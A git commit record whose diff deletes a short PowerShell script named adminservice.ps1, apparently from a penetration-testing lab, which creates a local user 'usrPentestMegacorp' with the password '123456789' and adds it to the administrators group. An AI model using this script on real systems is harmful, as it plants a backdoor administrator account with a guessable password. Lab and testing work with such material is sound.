313d816842663701558648d6e92594ea6d00205b
arnoudx6 <arnoud.stolk@ziggo.nl>
2022-11-06 13:25:30 +0100

    bb
    ccc

--- adminservice/adminservice.ps1
+++
@@ -1,5 +0,0 @@
-﻿Set-Location $PSScriptRoot #Change the working dir to the script folder
-Start-Transcript ".\log.txt" #Log all console output to a relative path for debugging purpose
-$user = New-LocalUser 'usrPentestMegacorp' -FullName 'Pentest Megacorp' -Password (ConvertTo-SecureString -AsPlainText '123456789' -Force) #Create a new user
-Add-LocalGroupMember -Member $user -Group 'administrators' #Add the user to the admin group
-Stop-Transcript
